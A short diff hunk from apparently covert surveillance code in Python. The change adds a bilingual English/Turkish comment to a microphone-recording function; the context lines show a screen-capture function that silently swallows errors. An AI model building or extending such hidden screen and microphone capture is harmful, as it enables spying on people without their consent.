@@ -99,7 +99,7 @@ def eagleye(): #Capture screen photo. Ekran resmini kaydet.
         ss.save(spp)
     except:
         pass
-def batears(battime):
+def batears(battime): #Capture the microphone. Bilgisayarın mikrofonunu kaydet.
     #time=time*60 #Convert to minute. Saniyeyi dakikaya çevirelim.
     batname="batears.wav"
     batpath=os.path.join(xdir,batname)
